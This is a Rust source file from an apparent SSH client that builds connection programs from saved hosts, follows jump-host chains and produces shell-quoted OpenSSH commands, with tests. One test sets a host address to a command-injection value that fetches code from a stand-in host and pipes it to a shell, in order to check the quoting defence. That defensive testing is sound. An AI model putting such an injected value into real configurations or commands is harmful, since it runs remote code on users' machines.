//! What a connection runs: a typed `user@host:port` or a saved host turned into a
//! [`Program`] for a session, with what the host inherits from its groups, its keychain key,
//! saved password and jump hosts. Shared by both UIs.

use annulus_session::{Hop, Password, Program, SshFiles, Target, local_user};
use annulus_vault::hosts::{DEFAULT_PORT, Host};
use annulus_vault::vault::Vault;

/// The longest jump chain followed; a longer one (or a loop) stops there.
const MAX_JUMPS: usize = 8;

/// Annulus's SSH client for `target` text (`user@host:port`), or the system `ssh` if the text
/// is not a target Annulus understands.
#[must_use]
pub fn quick(target: &str, files: &SshFiles) -> Program {
    match Target::parse(target, &local_user()) {
        Some(target) => Program::Ssh {
            target,
            files: files.clone(),
            password: None,
            identity: None,
            via: Vec::new(),
            proxy: None,
            reconnect: true,
            env: Vec::new(),
            startup: None,
            term: String::new(),
        },
        None => Program::system_ssh(target),
    }
}

/// The saved host typed text names, by its label in any case: a quick connect to it uses
/// its details (F-APP-006).
#[must_use]
pub fn saved<'a>(vault: &'a Vault, text: &str) -> Option<&'a Host> {
    let text = text.trim();
    vault
        .hosts()
        .iter()
        .find(|host| host.label.eq_ignore_ascii_case(text))
}

/// How to log in to a saved host: its target, saved password and keychain key, with what it
/// inherits from its groups.
fn hop(vault: &Vault, host: &Host) -> Option<Hop> {
    let (host, _) = vault.resolve(host);
    Some(Hop {
        target: Target::parse(&host.target(), &local_user())?,
        password: host
            .password
            .as_ref()
            .map(|secret| Password::new(secret.expose())),
        identity: host
            .key_id
            .and_then(|id| vault.ssh_key(id))
            .map(|key| Password::new(key.private.expose())),
        proxy: host.proxy.as_ref().map(|url| Password::new(url.expose())),
    })
}

/// The jump hosts in front of `host`, outermost first, each as its groups resolve it. A loop
/// or a missing host ends the chain where it is.
pub(crate) fn jump_chain(vault: &Vault, host: &Host) -> Vec<Hop> {
    let mut chain = Vec::new();
    let mut seen = vec![host.id];
    let mut next = vault.resolve(host).0.jump_id;
    while let Some(id) = next {
        if seen.contains(&id) || chain.len() >= MAX_JUMPS {
            break;
        }
        seen.push(id);
        let Some(jump) = vault.hosts().iter().find(|candidate| candidate.id == id) else {
            break;
        };
        let Some(hop) = hop(vault, jump) else { break };
        chain.push(hop);
        next = vault.resolve(jump).0.jump_id;
    }
    chain.reverse();
    chain
}

/// The login of a saved host and the jump hosts in front of it, outermost first (for an
/// SFTP connection); `None` when its target does not parse.
#[must_use]
pub fn login(vault: &Vault, host: &Host) -> Option<(Hop, Vec<Hop>)> {
    Some((hop(vault, host)?, jump_chain(vault, host)))
}

/// The program that connects to a saved host: through its jump hosts, with its key and saved
/// password.
#[must_use]
pub fn host(vault: &Vault, files: &SshFiles, host: &Host) -> Program {
    let (resolved, _) = vault.resolve(host);
    match hop(vault, host) {
        Some(hop) => Program::Ssh {
            target: hop.target,
            files: files.clone(),
            password: hop.password,
            identity: hop.identity,
            via: jump_chain(vault, host),
            proxy: hop.proxy,
            reconnect: !host.no_reconnect,
            env: resolved.env,
            startup: Some(resolved.startup).filter(|command| !command.trim().is_empty()),
            term: resolved.term,
        },
        None => Program::system_ssh(&resolved.target()),
    }
}

/// An OpenSSH command line that reaches `host` (through its jump host, if it has one), with
/// what it inherits from its groups, for pasting into another terminal (F-HOST-010). Saved
/// passwords are never part of it.
#[must_use]
pub fn ssh_command(vault: &Vault, host: &Host) -> String {
    let (host, _) = vault.resolve(host);
    let jump = host
        .jump_id
        .and_then(|id| vault.hosts().iter().find(|candidate| candidate.id == id))
        .map(|jump| vault.resolve(jump).0);
    let mut parts = vec!["ssh".to_owned()];
    if host.port() != DEFAULT_PORT {
        parts.push(format!("-p {}", host.port()));
    }
    if let Some(jump) = jump {
        parts.push(format!("-J {}", shell_word(&jump.target())));
    }
    let (user, address) = (host.username.trim(), host.address.trim());
    parts.push(shell_word(&if user.is_empty() {
        address.to_owned()
    } else {
        format!("{user}@{address}")
    }));
    parts.join(" ")
}

/// `word` as one word for a shell to paste into: as it is when it holds only what host names
/// and logins hold, else single-quoted (bash, zsh and PowerShell take it literally), so an
/// imported `$(…)` or `;` never runs as a command.
fn shell_word(word: &str) -> String {
    let plain = !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._-:@%+=,/".contains(c));
    if plain {
        word.to_owned()
    } else {
        format!("'{}'", word.replace('\'', r"'\''"))
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]

    use annulus_vault::hosts::Secret;

    use super::*;

    /// An empty vault of its own for test `name` (tests run side by side).
    fn vault(name: &str) -> Vault {
        let dir =
            std::env::temp_dir().join(format!("annulus-connect-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let cheap = annulus_vault::crypto::KdfParams {
            memory_kib: 64,
            iterations: 1,
            parallelism: 1,
        };
        Vault::create(dir.join("vault.anv"), "pw", cheap).unwrap().0
    }

    /// Saves a host with `label` at `address`; returns it.
    fn add(vault: &mut Vault, label: &str, address: &str) -> Host {
        let mut host = vault.draft_host();
        (host.label, host.address) = (label.into(), address.into());
        vault.upsert_host(host.clone()).unwrap();
        host
    }

    fn files() -> SshFiles {
        SshFiles {
            known_hosts: std::env::temp_dir().join("annulus-connect-known_hosts"),
            key_dir: None,
        }
    }

    #[test]
    fn a_host_in_a_group_connects_with_what_it_inherits() {
        let mut vault = vault("inherits");
        let bastion = add(&mut vault, "bastion", "jump.example.com");
        let mut group = vault.draft_group(None).unwrap();
        group.name = "prod".into();
        group.defaults.username = "deploy".into();
        group.defaults.port = Some(2200);
        group.defaults.jump_id = Some(bastion.id);
        vault.upsert_group(group.clone()).unwrap();
        // It sets nothing but its address and group.
        let mut inner = add(&mut vault, "grp", "10.0.4.12");
        inner.group = Some(group.uid);
        vault.upsert_host(inner.clone()).unwrap();
        let Program::Ssh { target, via, .. } = host(&vault, &files(), &inner) else {
            unreachable!("a saved host with an address is an ssh program")
        };
        assert_eq!(
            (target.user.as_str(), target.host.as_str(), target.port),
            ("deploy", "10.0.4.12", 2200)
        );
        let hops: Vec<&str> = via.iter().map(|hop| hop.target.host.as_str()).collect();
        assert_eq!(hops, ["jump.example.com"], "through the group's jump host");
    }

    #[test]
    fn a_jump_chain_runs_outermost_first_and_stops_at_a_loop() {
        let mut vault = vault("chain");
        let mut inner = add(&mut vault, "inner", "inner.example.com");
        let mut middle = add(&mut vault, "middle", "middle.example.com");
        let mut outer = add(&mut vault, "outer", "outer.example.com");
        inner.jump_id = Some(middle.id);
        middle.jump_id = Some(outer.id);
        vault.upsert_host(inner.clone()).unwrap();
        vault.upsert_host(middle).unwrap();
        let hops: Vec<String> = jump_chain(&vault, &inner)
            .into_iter()
            .map(|hop| hop.target.host)
            .collect();
        assert_eq!(hops, ["outer.example.com", "middle.example.com"]);

        // outer → inner closes a loop: the chain stops instead of going round.
        outer.jump_id = Some(inner.id);
        vault.upsert_host(outer).unwrap();
        assert_eq!(jump_chain(&vault, &inner).len(), 2);
    }

    #[test]
    fn the_ssh_command_has_port_jump_and_user_but_never_a_password() {
        let mut vault = vault("command");
        let mut jump = vault.draft_host();
        (jump.label, jump.address, jump.username) = (
            "bastion".into(),
            "bastion.example.com".into(),
            "admin".into(),
        );
        vault.upsert_host(jump.clone()).unwrap();
        let mut host = vault.draft_host();
        (host.label, host.address, host.username) =
            ("db".into(), "10.0.4.12".into(), "admin".into());
        host.port = Some(2222);
        host.jump_id = Some(jump.id);
        host.password = Some(Secret::new("hunter2"));
        vault.upsert_host(host.clone()).unwrap();
        let command = ssh_command(&vault, &host);
        assert_eq!(
            command,
            "ssh -p 2222 -J admin@bastion.example.com admin@10.0.4.12"
        );
        assert!(!command.contains("hunter2"));
        host.username.clear();
        (host.port, host.jump_id) = (Some(22), None);
        assert_eq!(ssh_command(&vault, &host), "ssh 10.0.4.12");
    }

    #[test]
    fn a_copied_ssh_command_quotes_what_a_shell_would_run() {
        let vault = vault("ssh-quoted");
        let mut host = vault.draft_host();
        // An address from an imported config, made to run something when pasted.
        host.address = "$(curl${IFS}evil|sh)".into();
        host.username = "o'neil".into();
        assert_eq!(
            ssh_command(&vault, &host),
            r"ssh 'o'\''neil@$(curl${IFS}evil|sh)'"
        );
        assert_eq!(
            shell_word("deploy@web-1.example.com"),
            "deploy@web-1.example.com"
        );
        assert_eq!(shell_word("10.0.0.1:2222"), "10.0.0.1:2222");
    }
}
